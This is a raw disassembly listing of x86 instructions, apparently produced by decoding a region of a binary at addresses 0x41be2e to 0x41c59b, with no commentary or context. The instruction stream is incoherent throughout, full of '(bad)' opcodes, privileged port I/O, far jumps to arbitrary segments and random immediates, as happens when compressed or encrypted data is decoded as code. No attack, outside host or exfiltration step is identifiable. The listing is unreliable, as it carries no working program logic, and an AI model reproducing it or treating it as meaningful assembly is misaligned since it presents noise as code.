  41be2e:	sbb    eax,0x48469578
  41be33:	mov    ds:0x127cf914,al
  41be38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be39:	cmp    eax,0xdee1056f
  41be3e:	mov    ch,0x9a
  41be40:	hlt    
  41be41:	popa   
  41be42:	int    0x48
  41be44:	mov    ds:0xc2aad6,al
  41be49:	daa    
  41be4a:	add    ebp,ecx
  41be4c:	dec    eax
  41be4d:	inc    edi
  41be4e:	adc    al,0x50
  41be50:	or     DWORD PTR [edi+0x39],ebp
  41be53:	loope  0x41bebd
  41be55:	pop    ecx
  41be56:	in     eax,dx
  41be57:	jp     0x41be67
  41be59:	lock out dx,al
  41be5b:	mov    ebp,0x48befb74
  41be60:	dec    edx
  41be61:	pop    ebx
  41be62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be63:	mov    ah,0xfd
  41be65:	jnp    0x41be1c
  41be67:	or     esp,esi
  41be69:	cmp    al,0xfc
  41be6b:	pslld  mm2,QWORD PTR [esi+0x7a83c7c7]
  41be72:	adc    DWORD PTR [esi+0x983cb23],ecx
  41be78:	cmp    al,0xeb
  41be7a:	adc    ah,BYTE PTR [ecx-0x26]
  41be7d:	sbb    BYTE PTR [edx+0x32],al
  41be80:	push   ebp
  41be81:	cwde   
  41be82:	pusha  
  41be83:	out    0xcd,al
  41be85:	adc    DWORD PTR [esi],eax
  41be87:	(bad)  
  41be88:	jle    0x41bec7
  41be8a:	aas    
  41be8b:	loop   0x41befa
  41be8d:	not    BYTE PTR [ecx]
  41be8f:	or     DWORD PTR [edi+0x77],edx
  41be92:	clc    
  41be93:	ins    DWORD PTR es:[edi],dx
  41be94:	les    ebx,FWORD PTR [esp+ecx*1]
  41be97:	lea    ebp,[edi-0x77]
  41be9a:	push   ss
  41be9b:	popf   
  41be9c:	(bad)  
  41be9d:	cmp    ch,BYTE PTR [edi-0x7b]
  41bea0:	push   edx
  41bea1:	push   bx
  41bea3:	pop    ebp
  41bea4:	xchg   ebp,eax
  41bea5:	popa   
  41bea6:	pop    ecx
  41bea7:	fimul  WORD PTR [esi]
  41bea9:	jo     0x41bee1
  41beab:	mov    bh,0xa7
  41bead:	scas   al,BYTE PTR es:[edi]
  41beae:	xchg   esi,eax
  41beb0:	jmp    0x6d5:0x4859e832
  41beb7:	sti    
  41beb8:	jmp    0xdee0c235
  41bebd:	push   cs
  41bebe:	das    
  41bebf:	dec    ecx
  41bec0:	jb     0x41bea5
  41bec2:	into   
  41bec3:	sbb    eax,0x80b5c9b3
  41bec8:	pop    edi
  41bec9:	pop    esp
  41beca:	jecxz  0x41be87
  41becc:	outs   dx,DWORD PTR ds:[esi]
  41becd:	jmp    0xa297e57c
  41bed2:	bound  esi,QWORD PTR [ebp+0xb]
  41bed5:	push   cs
  41bed6:	dec    ecx
  41bed7:	test   al,0xf5
  41bed9:	pop    ecx
  41beda:	loope  0x41beb5
  41bedc:	cs xchg esi,eax
  41bede:	and    edi,DWORD PTR [edi-0x4e9c18c6]
  41bee4:	icebp  
  41bee5:	mov    edx,0xcd5eca33
  41beea:	sub    eax,0xde130121
  41beef:	popa   
  41bef0:	sbb    al,al
  41bef2:	jno    0x41bf2f
  41bef4:	mov    edx,0xfa213c0d
  41bef9:	retf   
  41befa:	jl     0x41bf47
  41befc:	sahf   
  41befd:	fild   WORD PTR [ecx]
  41beff:	push   es
  41bf00:	dec    edx
  41bf01:	sahf   
  41bf02:	ds sbb eax,0x4655317d
  41bf08:	xor    DWORD PTR [edx],esp
  41bf0a:	add    esp,eax
  41bf0c:	sbb    ebx,DWORD PTR [ebx+0x7e34ccb]
  41bf12:	std    
  41bf13:	jo     0x41bf47
  41bf15:	xchg   esi,eax
  41bf16:	sub    DWORD PTR [edi+0x4f3efa2d],eax
  41bf1c:	cmp    eax,0x124c1d57
  41bf21:	cmp    dl,ah
  41bf23:	mov    es,WORD PTR ss:[esi]
  41bf26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf27:	sbb    DWORD PTR [esi+0x20],ebp
  41bf2a:	push   eax
  41bf2b:	xor    DWORD PTR [ebx-0x52],eax
  41bf2e:	and    eax,0x1b596cb7
  41bf33:	mov    esp,0xd216f6c8
  41bf38:	(bad)  
  41bf39:	sbb    al,0x79
  41bf3b:	pop    edx
  41bf3c:	loope  0x41bef1
  41bf3e:	ret    
  41bf3f:	and    BYTE PTR [esi+esi*4-0x18],bh
  41bf43:	push   esi
  41bf44:	push   ecx
  41bf45:	rol    BYTE PTR [ecx-0x6e3f8a31],1
  41bf4b:	cmp    al,0xd5
  41bf4d:	outs   dx,BYTE PTR ds:[esi]
  41bf4e:	xor    ebp,DWORD PTR ds:0xf5c1a335
  41bf54:	loope  0x41bf9b
  41bf56:	or     eax,0x6d31e29e
  41bf5b:	cmp    edx,esi
  41bf5d:	inc    esp
  41bf5e:	es pop ebx
  41bf60:	inc    eax
  41bf61:	pop    es
  41bf62:	lods   eax,DWORD PTR ds:[esi]
  41bf63:	pop    ss
  41bf64:	sub    bl,dl
  41bf66:	int    0x8
  41bf68:	jge    0x41bf57
  41bf6a:	fsub   DWORD PTR [esp+ebp*2]
  41bf6d:	jb     0x41bf39
  41bf6f:	and    al,0xc6
  41bf71:	xchg   ecx,eax
  41bf72:	mov    bh,0xbf
  41bf74:	sub    esp,DWORD PTR [edi]
  41bf76:	add    eax,0xaec8846b
  41bf7b:	add    bl,BYTE PTR ds:0xe79bda41
  41bf81:	add    eax,0x2746c33f
  41bf86:	mul    BYTE PTR [edi+0x39]
  41bf89:	dec    ebp
  41bf8a:	scas   eax,DWORD PTR es:[edi]
  41bf8b:	test   al,0xd
  41bf8d:	das    
  41bf8e:	push   ss
  41bf8f:	out    dx,al
  41bf90:	(bad)  
  41bf92:	jmp    0xe0c827e9
  41bf97:	clc    
  41bf98:	mov    ch,0x23
  41bf9a:	cmp    eax,0xd59e19b9
  41bf9f:	loopne 0x41bf91
  41bfa1:	stc    
  41bfa2:	or     BYTE PTR [eax],dl
  41bfa4:	push   esp
  41bfa5:	mov    ecx,0x632cec11
  41bfaa:	leave  
  41bfab:	stc    
  41bfac:	imul   esp,DWORD PTR [edi+eiz*8+0x6d],0x47
  41bfb1:	jge    0x41bf99
  41bfb3:	sahf   
  41bfb4:	push   es
  41bfb5:	and    eax,0x56eb7ca9
  41bfba:	fistp  DWORD PTR [edx+0x7090b0ea]
  41bfc0:	ror    DWORD PTR ds:0x84b04e1e,1
  41bfc6:	adc    eax,0xb4108aa0
  41bfcb:	(bad)
  41bfce:	xor    ah,ch
  41bfd0:	mov    ecx,0x9bd7faf1
  41bfd5:	es mov bh,0x90
  41bfd8:	sti    
  41bfd9:	dec    ecx
  41bfda:	stc    
  41bfdb:	dec    edi
  41bfdc:	shr    BYTE PTR [ebp+edi*2-0x28ebbe1],1
  41bfe3:	dec    edi
  41bfe4:	imul   edi,DWORD PTR [esi+0x38],0xffffffc5
  41bfe8:	mov    dl,0x77
  41bfea:	imul   ebp,DWORD PTR [eax-0x4],0x17
  41bfee:	or     BYTE PTR [ebx-0x5773b63b],dl
  41bff4:	mov    ch,BYTE PTR [bp+di]
  41bff7:	(bad)  
  41bff8:	fucomp st(0)
  41bffa:	sbb    edx,ebx
  41bffc:	stc    
  41bffd:	(bad)  
  41bffe:	cmc    
  41bfff:	sub    al,0x5e
  41c001:	ins    DWORD PTR es:[edi],dx
  41c002:	push   ebx
  41c003:	adc    ah,cl
  41c005:	or     ax,0xf67
  41c009:	jnp    0x41c020
  41c00b:	push   ds
  41c00c:	adc    BYTE PTR [esi],dl
  41c00e:	adc    DWORD PTR [edi-0x53b068b2],ebp
  41c014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c015:	test   DWORD PTR [edi+ecx*8-0x1e],ebx
  41c019:	aaa    
  41c01a:	sbb    al,0x18
  41c01c:	mov    ecx,edi
  41c01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c01f:	dec    edx
  41c020:	inc    ebp
  41c021:	sbb    esp,DWORD PTR [ebx]
  41c023:	ins    DWORD PTR es:[edi],dx
  41c024:	pop    ecx
  41c025:	sahf   
  41c026:	(bad)  [edx]
  41c028:	cdq    
  41c029:	mov    ch,0xe4
  41c02b:	pop    ecx
  41c02c:	push   0xdb917223
  41c031:	mul    edi
  41c033:	dec    esi
  41c034:	aam    0x5
  41c036:	mov    esi,0x753c3f49
  41c03b:	cmp    esp,DWORD PTR [edx+0x74fe0d01]
  41c041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c042:	aaa    
  41c043:	xchg   ecx,eax
  41c044:	xor    DWORD PTR [edx],esp
  41c046:	nop
  41c047:	ret    
  41c048:	xchg   edi,eax
  41c049:	lock jno 0x41c059
  41c04c:	dec    esi
  41c04d:	adc    eax,DWORD PTR [esi-0x3cbb557d]
  41c053:	push   esp
  41c054:	cwde   
  41c055:	ins    BYTE PTR es:[edi],dx
  41c056:	out    0x97,al
  41c058:	add    BYTE PTR [ebx],bh
  41c05a:	retf   0x1262
  41c05d:	aad    0x9d
  41c05f:	jg     0x41c001
  41c061:	mov    ch,0xca
  41c063:	fnsave ds:0xadc18699
  41c069:	mov    edx,0xb73ba86c
  41c06e:	pop    edi
  41c06f:	sar    eax,cl
  41c071:	xchg   esp,eax
  41c072:	ror    DWORD PTR [ecx+eax*8-0x53],0xa3
  41c077:	inc    eax
  41c078:	pop    es
  41c079:	and    ebp,ebx
  41c07b:	(bad)  
  41c07c:	into   
  41c07d:	sahf   
  41c07e:	sahf   
  41c07f:	mov    bh,0x89
  41c081:	jno    0x41c041
  41c083:	ja     0x41c03e
  41c085:	pop    esi
  41c086:	xor    al,0xf2
  41c088:	icebp  
  41c089:	push   0xffffffe9
  41c08b:	pop    ecx
  41c08c:	scas   eax,DWORD PTR es:[edi]
  41c08d:	retf   0x6269
  41c090:	inc    ecx
  41c091:	jmp    0x41c06a
  41c093:	and    bl,ch
  41c095:	sub    ecx,DWORD PTR [ecx-0x7adcc0b6]
  41c09b:	push   eax
  41c09c:	mov    BYTE PTR [edx],ch
  41c09e:	cmp    edi,DWORD PTR [eax+0x2fc485a0]
  41c0a4:	fmul   st(6),st
  41c0a6:	(bad)  
  41c0a7:	push   ss
  41c0a8:	(bad)  
  41c0a9:	mov    BYTE PTR [ecx+0xa86f8ee],al
  41c0af:	in     al,dx
  41c0b0:	stos   DWORD PTR es:[edi],eax
  41c0b1:	add    cl,BYTE PTR [ebx]
  41c0b3:	jmp    0xd422:0xc592820a
  41c0ba:	dec    edx
  41c0bb:	and    BYTE PTR [edx+0x48],0x27
  41c0bf:	jo     0x41c0d8
  41c0c1:	shl    al,1
  41c0c3:	lods   eax,DWORD PTR ds:[esi]
  41c0c4:	outs   dx,DWORD PTR ds:[esi]
  41c0c5:	mov    eax,0x477b9ff3
  41c0ca:	inc    ebx
  41c0cb:	push   es
  41c0cc:	xor    DWORD PTR ds:0x471d3468,eax
  41c0d2:	mov    esi,0x2c658802
  41c0d7:	add    eax,DWORD PTR [ecx]
  41c0d9:	or     al,0x80
  41c0db:	fiadd  DWORD PTR [edx-0x3a]
  41c0de:	dec    edx
  41c0df:	xchg   ecx,eax
  41c0e0:	and    bl,dh
  41c0e2:	dec    esp
  41c0e3:	in     al,dx
  41c0e4:	enter  0x4ccf,0x23
  41c0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e9:	mov    es,WORD PTR [edx+eiz*4-0x54]
  41c0ed:	out    0x26,al
  41c0ef:	push   es
  41c0f0:	dec    ebp
  41c0f1:	jmp    0x600a:0x21bf400d
  41c0f8:	jmp    0x5e3b3856
  41c0fd:	mov    bl,0x66
  41c0ff:	lock in eax,0xa0
  41c102:	mov    DWORD PTR [edx+eax*2],esi
  41c105:	sub    dl,bh
  41c107:	push   ecx
  41c108:	push   cs
  41c109:	jbe    0x41c183
  41c10b:	inc    eax
  41c10c:	dec    esp
  41c10d:	jmp    0x41c0b2
  41c10f:	mov    bh,0x7e
  41c111:	jmp    0x5c631e6a
  41c116:	mov    ecx,0x8ce185d8
  41c11b:	fimul  WORD PTR [ecx]
  41c11d:	iret   
  41c11e:	fcomp  DWORD PTR [eax+edi*8]
  41c121:	ret    
  41c122:	fcomip st,st(0)
  41c124:	popf   
  41c125:	out    0x37,al
  41c127:	cmp    DWORD PTR [edx],0xa
  41c12a:	cdq    
  41c12b:	and    eax,0x6fb8af7b
  41c130:	imul   eax,DWORD PTR [edi-0x347a0d95],0x93e8518
  41c13a:	int3   
  41c13b:	jns    0x41c19a
  41c13d:	cmp    eax,0x3eef26b
  41c142:	sbb    ebp,esp
  41c144:	pop    esp
  41c145:	cwde   
  41c146:	jbe    0x41c129
  41c148:	mov    bl,0xd6
  41c14a:	aas    
  41c14b:	add    edx,DWORD PTR [esp+0x2fe36a75]
  41c152:	push   ebx
  41c153:	ja     0x41c19c
  41c155:	rcl    DWORD PTR [edi],0xba
  41c158:	cmp    cl,BYTE PTR [ecx+ebp*1-0xb]
  41c15c:	mov    ch,0x83
  41c15e:	jmp    0xb521:0xf2e4b2f5
  41c165:	or     eax,0x98ce39b0
  41c16a:	jmp    0xc47f8baf
  41c16f:	xchg   edi,eax
  41c170:	fwait
  41c171:	call   DWORD PTR [ebx+0x29]
  41c174:	cmp    al,0x3b
  41c176:	dec    ecx
  41c177:	pop    ebx
  41c178:	xchg   bh,cl
  41c17a:	push   esi
  41c17b:	or     DWORD PTR [esp+ebp*2-0x36],esi
  41c17f:	pop    ss
  41c180:	cld    
  41c181:	fnstcw WORD PTR [esi]
  41c183:	mov    dh,0x30
  41c185:	test   bl,dl
  41c187:	or     al,0xe3
  41c189:	adc    al,0x5c
  41c18b:	retf   
  41c18c:	scas   al,BYTE PTR es:[edi]
  41c18d:	imul   edi,DWORD PTR [ecx-0x7d],0x2e68b654
  41c194:	push   ecx
  41c195:	test   eax,0xd2816d00
  41c19a:	and    al,0x69
  41c19c:	xor    ch,dh
  41c19e:	cdq    
  41c19f:	or     DWORD PTR [ebx-0x3c],ecx
  41c1a2:	sub    esi,edi
  41c1a4:	loop   0x41c1a5
  41c1a6:	push   0x739048a7
  41c1ab:	ret    
  41c1ac:	jle    0x41c175
  41c1ae:	cmp    DWORD PTR [esi],esp
  41c1b0:	pusha  
  41c1b1:	jg     0x41c1d6
  41c1b3:	xchg   esp,eax
  41c1b4:	jmp    0x41c1a0
  41c1b6:	sub    al,0x4
  41c1b8:	imul   ebp,ebp,0x20f952cd
  41c1be:	mov    DWORD PTR [eax-0x2a],esi
  41c1c1:	mov    ch,0x6c
  41c1c3:	mov    edi,0xd3b09071
  41c1c8:	mov    ebx,0x3b79fd6d
  41c1cd:	dec    ebp
  41c1ce:	(bad)  
  41c1cf:	cli    
  41c1d0:	sbb    eax,0xf7493146
  41c1d5:	jg     0x41c1ef
  41c1d7:	cli    
  41c1d8:	dec    ebx
  41c1d9:	ss div ch
  41c1dc:	repnz sbb al,0x1b
  41c1df:	call   0x64daa588
  41c1e4:	mov    ah,0x5c
  41c1e6:	sub    edi,DWORD PTR [esi]
  41c1e8:	call   0xf645f78
  41c1ed:	xlat   BYTE PTR ds:[ebx]
  41c1ee:	push   esi
  41c1ef:	mov    ecx,DWORD PTR [ebx]
  41c1f1:	adc    BYTE PTR [ecx],dl
  41c1f3:	fwait
  41c1f4:	mov    eax,DWORD PTR ds:0x70df58a2
  41c1fa:	adc    al,0x5
  41c1fc:	mov    bl,0xca
  41c1fe:	fs das 
  41c200:	mov    al,0x72
  41c202:	ins    DWORD PTR es:[edi],dx
  41c203:	lods   al,BYTE PTR ds:[esi]
  41c204:	fsubr  st(6),st
  41c206:	lods   eax,DWORD PTR ds:[esi]
  41c207:	mov    al,0x44
  41c209:	xor    ah,BYTE PTR [eax]
  41c20b:	mov    BYTE PTR [esp+edi*8],al
  41c20e:	cmc    
  41c20f:	pushf  
  41c210:	cmp    BYTE PTR [ebx-0x7d237bcb],dh
  41c216:	mov    cl,al
  41c218:	xchg   edi,eax
  41c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21a:	cmp    eax,0x997a0461
  41c21f:	popa   
  41c220:	retf   
  41c221:	pop    ebp
  41c222:	(bad)  [ebx+0x26a5b565]
  41c228:	push   edx
  41c229:	and    ebx,DWORD PTR [ecx+ebp*2-0x76]
  41c22d:	jne    0x41c260
  41c22f:	dec    BYTE PTR ds:0xdd37150e
  41c235:	mov    edi,0xdb28a39a
  41c23a:	xor    DWORD PTR [esi],0xed5a4a2c
  41c240:	add    dl,BYTE PTR [esi]
  41c242:	dec    ebx
  41c243:	mov    cl,0x4c
  41c245:	pop    DWORD PTR [edi+edx*4]
  41c248:	call   0xd39546e9
  41c24d:	in     eax,dx
  41c24e:	fidivr DWORD PTR ds:0xaa3afb1f
  41c254:	mov    ds:0x9e63d84b,eax
  41c259:	ss cmc 
  41c25b:	xor    DWORD PTR [edi],0x566dea89
  41c261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c262:	dec    ebp
  41c263:	ret    
  41c264:	(bad)  
  41c266:	sbb    DWORD PTR [ecx-0x3e99bc0a],0x4c824cc
  41c270:	sbb    esp,ebx
  41c272:	dec    edi
  41c273:	call   0xaee7:0x498df9cf
  41c27a:	jl     0x41c227
  41c27c:	stos   BYTE PTR es:[edi],al
  41c27d:	in     al,0xbb
  41c27f:	fcom   DWORD PTR [edx]
  41c281:	icebp  
  41c282:	mov    eax,0xe2922b6d
  41c287:	sub    BYTE PTR [ebx-0x368e1403],cl
  41c28d:	out    dx,al
  41c28e:	push   eax
  41c28f:	mov    bh,0x5a
  41c291:	jg     0x41c25d
  41c293:	dec    ecx
  41c294:	loope  0x41c2e2
  41c296:	adc    eax,0xb6904626
  41c29b:	cld    
  41c29c:	repnz scas al,BYTE PTR es:[di]
  41c29f:	leave  
  41c2a0:	lock mov ds:0x77d50af8,eax
  41c2a6:	jmp    0x88bc:0x978b6b33
  41c2ad:	add    DWORD PTR [ebx-0x13],edx
  41c2b0:	jo     0x41c25f
  41c2b2:	dec    eax
  41c2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b4:	js     0x41c306
  41c2b6:	rol    BYTE PTR [eax+0x5faecab8],1
  41c2bc:	stc    
  41c2bd:	dec    esp
  41c2be:	test   al,0xf
  41c2c0:	(bad)  
  41c2c1:	pop    ebx
  41c2c2:	clc    
  41c2c3:	sub    eax,0xdd016e1c
  41c2c8:	imul   esi,DWORD PTR gs:[ebx-0x4f4f5af4],0x3f01c22d
  41c2d3:	jmp    DWORD PTR [ebp+0x3]
  41c2d6:	push   0xde81aed7
  41c2db:	sti    
  41c2dc:	mov    DWORD PTR [esi],0x1aae4993
  41c2e2:	stos   BYTE PTR es:[edi],al
  41c2e3:	mov    dl,0xdb
  41c2e5:	aas    
  41c2e6:	adc    esi,ebx
  41c2e8:	(bad)  
  41c2e9:	(bad)  
  41c2ea:	in     al,0x70
  41c2ec:	ja     0x41c28e
  41c2ee:	inc    ebp
  41c2ef:	int3   
  41c2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2f1:	fld    TBYTE PTR [eax-0x8]
  41c2f4:	cmp    DWORD PTR [ebx],0x3d480a91
  41c2fa:	call   0xd4b7:0x164c8ae9
  41c301:	call   0x96209cbd
  41c306:	mov    al,0x87
  41c308:	ins    DWORD PTR es:[edi],dx
  41c309:	sub    bl,dl
  41c30b:	add    edi,esi
  41c30d:	jne    0x41c32a
  41c30f:	mov    bh,0x9
  41c311:	mov    esp,0xfbf48867
  41c316:	push   ebp
  41c317:	mov    bp,0xfa5d
  41c31b:	jo     0x41c313
  41c31d:	xor    eax,0x14680262
  41c322:	pop    ecx
  41c323:	adc    BYTE PTR [esi+ecx*8],al
  41c326:	ret    
  41c327:	into   
  41c328:	xchg   dh,cl
  41c32a:	mov    ebx,DWORD PTR [edi+0x58a3951c]
  41c330:	fbld   TBYTE PTR [ecx-0x771fef72]
  41c336:	es data16 (bad) 
  41c339:	push   ds
  41c33a:	xor    ebx,DWORD PTR [esi]
  41c33c:	je     0x41c329
  41c33e:	outs   dx,BYTE PTR ds:[esi]
  41c33f:	dec    edx
  41c340:	pop    es
  41c341:	push   eax
  41c342:	lods   al,BYTE PTR ds:[esi]
  41c343:	jle    0x41c3a9
  41c345:	dec    esi
  41c346:	lea    edx,[esi*2-0x5b0a47bb]
  41c34d:	dec    esp
  41c34e:	jnp    0x41c32d
  41c350:	arpl   WORD PTR [eax-0x29],sp
  41c353:	ret    0x5014
  41c356:	adc    eax,0x2e983289
  41c35b:	cld    
  41c35c:	pop    edx
  41c35d:	dec    eax
  41c35e:	push   0x71d6a646
  41c363:	js     0x41c3a7
  41c365:	std    
  41c366:	je     0x41c361
  41c368:	fstp   DWORD PTR [esi]
  41c36a:	cmp    al,0xb5
  41c36c:	test   al,0xc6
  41c36e:	inc    eax
  41c36f:	out    0x28,al
  41c371:	mov    dh,0x8b
  41c373:	or     eax,0xb01f5f07
  41c378:	jecxz  0x41c341
  41c37a:	and    BYTE PTR [edi+0x3f],ah
  41c37d:	sbb    edi,DWORD PTR [edi-0x50055e9a]
  41c383:	adc    al,0xdd
  41c385:	imul   edx,DWORD PTR [ebp+0x5949d6d6],0xffffffd7
  41c38c:	retf   0xd8f5
  41c38f:	cli    
  41c390:	xor    al,0x32
  41c392:	push   fs
  41c394:	mov    ch,0x11
  41c396:	inc    sp
  41c398:	xor    al,cl
  41c39a:	push   ebp
  41c39b:	outs   dx,DWORD PTR ds:[esi]
  41c39c:	std    
  41c39d:	setbe  BYTE PTR [edi+ebp*8]
  41c3a1:	push   ecx
  41c3a2:	xor    eax,0x944c195b
  41c3a7:	fistp  WORD PTR [edi+0x6b]
  41c3aa:	and    esp,DWORD PTR [ecx]
  41c3ac:	stos   BYTE PTR es:[edi],al
  41c3ad:	shr    edi,0xd4
  41c3b0:	push   ebp
  41c3b1:	je     0x41c363
  41c3b3:	dec    esi
  41c3b4:	rcl    BYTE PTR [esi-0x2609fc44],1
  41c3ba:	scas   eax,DWORD PTR es:[edi]
  41c3bb:	jnp    0x41c3d6
  41c3bd:	aaa    
  41c3be:	scas   al,BYTE PTR es:[edi]
  41c3bf:	or     al,0x14
  41c3c1:	push   ss
  41c3c2:	repnz push eax
  41c3c4:	push   ecx
  41c3c5:	pop    es
  41c3c6:	std    
  41c3c7:	push   ss
  41c3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c9:	shr    BYTE PTR [esi-0x6c7d2fb2],0x48
  41c3d0:	sbb    edi,0xe4ebd38e
  41c3d6:	ja     0x41c401
  41c3d8:	int    0x16
  41c3da:	mov    ds:0x2fad86c0,al
  41c3df:	shl    BYTE PTR [esi+0x63],0xd4
  41c3e3:	cmp    al,0xd4
  41c3e5:	xor    DWORD PTR [eax-0x73f6461a],ebx
  41c3eb:	iret   
  41c3ec:	mov    fs,WORD PTR [edx]
  41c3ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ef:	sbb    ah,ch
  41c3f1:	add    eax,0x30b7fb9
  41c3f6:	xchg   edx,eax
  41c3f7:	xchg   ebp,eax
  41c3f8:	into   
  41c3f9:	psubd  mm5,QWORD PTR [edx+0xc]
  41c3fd:	pop    es
  41c3fe:	fbld   TBYTE PTR [ecx-0x66d5c178]
  41c404:	in     al,dx
  41c405:	rol    DWORD PTR [ecx+0xd],0x8d
  41c409:	xchg   ecx,eax
  41c40a:	adc    edx,DWORD PTR [ebx]
  41c40c:	mov    WORD PTR [edi-0x2a708680],ds
  41c412:	lahf   
  41c413:	jg     0x41c46f
  41c415:	test   eax,0x69c06df4
  41c41a:	inc    ebx
  41c41b:	out    0xdb,al
  41c41d:	hlt    
  41c41e:	nop
  41c41f:	lock out 0x65,eax
  41c422:	ret    0x44dd
  41c425:	add    al,0xa9
  41c427:	jg     0x41c481
  41c429:	imul   esp,ebp,0xffffff8d
  41c42c:	dec    esp
  41c42d:	pop    ebp
  41c42e:	mov    dl,0xa9
  41c430:	lahf   
  41c431:	and    BYTE PTR [ecx-0x174e8a88],dl
  41c437:	fdivr  QWORD PTR [edi+0x1985164e]
  41c43d:	repnz mov ebp,0x727cb16a
  41c443:	mov    cl,0x3e
  41c445:	stc    
  41c446:	pop    eax
  41c447:	loopne 0x41c4ba
  41c449:	cmp    DWORD PTR [ebp+0x20],ecx
  41c44c:	out    dx,al
  41c44d:	adc    DWORD PTR [esi+0x21],edx
  41c450:	dec    edi
  41c451:	cmp    edx,DWORD PTR [edi+0x4b]
  41c454:	stc    
  41c455:	outs   dx,BYTE PTR ds:[esi]
  41c456:	mov    WORD PTR [ecx],cs
  41c458:	pop    esi
  41c459:	daa    
  41c45a:	out    dx,al
  41c45b:	das    
  41c45c:	loopne 0x41c410
  41c45e:	push   eax
  41c45f:	aas    
  41c460:	jnp    0x41c424
  41c462:	xchg   ebp,eax
  41c463:	cdq    
  41c464:	mov    cs,esp
  41c466:	xor    DWORD PTR [eax+0x228472f0],ecx
  41c46c:	mov    al,ds:0x52b07bdb
  41c471:	pushf  
  41c472:	pushf  
  41c473:	(bad)  
  41c474:	mov    ebx,0x296cdfc0
  41c479:	push   0xfffffffd
  41c47b:	dec    esp
  41c47c:	call   0xb2ad:0x47b741ed
  41c483:	bound  edx,QWORD PTR [ebx-0xf644d1a]
  41c489:	mov    BYTE PTR [ebp-0x589fe765],ch
  41c48f:	in     al,0x92
  41c491:	stos   DWORD PTR es:[edi],eax
  41c492:	ror    BYTE PTR [edx-0x793a07c9],1
  41c498:	test   BYTE PTR [edx],0xeb
  41c49b:	mov    ecx,0x64a578af
  41c4a0:	pop    edi
  41c4a1:	jno    0x41c428
  41c4a3:	sub    BYTE PTR [eax],cl
  41c4a5:	out    0x60,al
  41c4a7:	gs scas eax,DWORD PTR es:[edi]
  41c4a9:	adc    ebp,DWORD PTR [ebx+ebx*4]
  41c4ac:	xor    eax,0x51aa0c3c
  41c4b1:	(bad)  
  41c4b2:	xor    dh,bh
  41c4b4:	pop    edi
  41c4b5:	dec    eax
  41c4b6:	fisub  DWORD PTR [esi+0x5b]
  41c4b9:	push   esp
  41c4ba:	jae    0x41c4b6
  41c4bc:	test   BYTE PTR [ecx-0x46ea67db],ch
  41c4c2:	push   eax
  41c4c3:	pop    ebx
  41c4c4:	xchg   esi,eax
  41c4c5:	mov    cl,0xa0
  41c4c7:	outs   dx,BYTE PTR ds:[esi]
  41c4c8:	fidiv  DWORD PTR ds:0xc6eb1d84
  41c4ce:	(bad)  
  41c4cf:	pop    edi
  41c4d0:	fst    QWORD PTR [edi+0x38]
  41c4d3:	pop    esi
  41c4d4:	cmp    eax,0x8d5e1c40
  41c4d9:	inc    eax
  41c4da:	das    
  41c4db:	adc    DWORD PTR [edi-0x27ca7ef9],ebx
  41c4e1:	jp     0x41c480
  41c4e3:	clc    
  41c4e4:	shl    DWORD PTR [esp+ebp*1-0x7b4f55ac],cl
  41c4eb:	call   FWORD PTR [eax-0x9f1ce9d]
  41c4f1:	mov    cl,0x9a
  41c4f3:	in     al,dx
  41c4f4:	fisttp DWORD PTR [edx]
  41c4f6:	xchg   DWORD PTR [eax-0x40064b93],edx
  41c4fc:	les    edi,FWORD PTR [edx]
  41c4fe:	in     al,dx
  41c4ff:	mov    eax,0xf33a5f4c
  41c504:	or     BYTE PTR [ebp-0x1bf44da3],0x3e
  41c50b:	pusha  
  41c50c:	das    
  41c50d:	ss pusha 
  41c50f:	sub    eax,0x6cf735ef
  41c514:	mov    eax,ds:0xd638849a
  41c519:	jbe    0x41c4d0
  41c51b:	test   dh,al
  41c51d:	cmc    
  41c51e:	in     al,dx
  41c51f:	sub    eax,DWORD PTR [edi-0x44f5a20f]
  41c525:	sub    al,0xb8
  41c527:	out    dx,al
  41c528:	adc    al,BYTE PTR [eax]
  41c52a:	loopne 0x41c535
  41c52c:	push   eax
  41c52d:	pop    es
  41c52e:	xor    ebp,eax
  41c530:	dec    ebp
  41c531:	push   esi
  41c532:	ror    ch,cl
  41c534:	out    dx,al
  41c535:	das    
  41c536:	inc    esi
  41c537:	cdq    
  41c538:	mov    ds:0xf803ad31,eax
  41c53d:	xor    bh,ah
  41c53f:	lods   al,BYTE PTR ds:[esi]
  41c540:	mov    ds:0x8a473c91,al
  41c545:	fwait
  41c546:	mov    cs,WORD PTR [ebp+0x68]
  41c549:	mov    ah,0x52
  41c54b:	xor    BYTE PTR [esi+0x6de59f2e],bl
  41c551:	data16 ins BYTE PTR es:[edi],dx
  41c553:	inc    ecx
  41c554:	dec    esi
  41c555:	push   edx
  41c556:	push   eax
  41c557:	lea    esp,[eax-0x49b9696a]
  41c55d:	dec    ebx
  41c55e:	dec    ecx
  41c55f:	pusha  
  41c560:	xor    DWORD PTR [eax-0x12a8e21e],ebx
  41c566:	inc    edx
  41c567:	push   ebp
  41c568:	les    esi,FWORD PTR [ebx+0x1578d002]
  41c56e:	pop    esi
  41c56f:	mov    dl,cl
  41c571:	sub    bh,bh
  41c573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c574:	jbe    0x41c523
  41c576:	add    al,0x1f
  41c578:	aam    0xb4
  41c57a:	hlt    
  41c57b:	adc    DWORD PTR [edi+0x6efd6f87],eax
  41c581:	(bad)  
  41c582:	jmp    0xd5a8:0xcd1540ab
  41c589:	and    edi,esi
  41c58b:	mov    esi,0x3eb71b64
  41c590:	pop    es
  41c591:	sbb    al,0x4
  41c593:	mov    ebx,ebx
  41c595:	xor    DWORD PTR ss:[esi-0x71],esp
  41c599:	jl     0x41c532
  41c59b:	test   DWORD PTR [eax+0x2d],ecx
